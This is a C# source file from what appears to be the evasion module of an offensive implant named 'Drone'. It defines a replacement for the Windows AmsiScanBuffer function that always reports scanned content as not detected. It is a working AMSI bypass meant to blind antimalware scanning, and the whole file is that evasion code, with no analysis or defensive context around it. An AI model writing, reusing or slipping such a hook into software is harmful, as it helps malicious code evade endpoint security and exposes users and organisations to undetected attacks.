using System;
using System.Runtime.InteropServices;

namespace Drone.Evasion
{
    public static class Amsi
    {
        public static AmsiScanBufferDelegate AmsiScanBufferOriginal { get; set; }
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet=CharSet.Auto)]
        public delegate uint AmsiScanBufferDelegate(
            IntPtr amsiContext,
            byte[] buffer,
            uint length,
            string contentName,
            IntPtr session,
            out uint result);

        public static uint AmsiScanBufferDetour(IntPtr amsiContext, byte[] buffer, uint length, string contentName, IntPtr session, out uint result)
        {
            result = 1;
            return 0;
        }
    }
}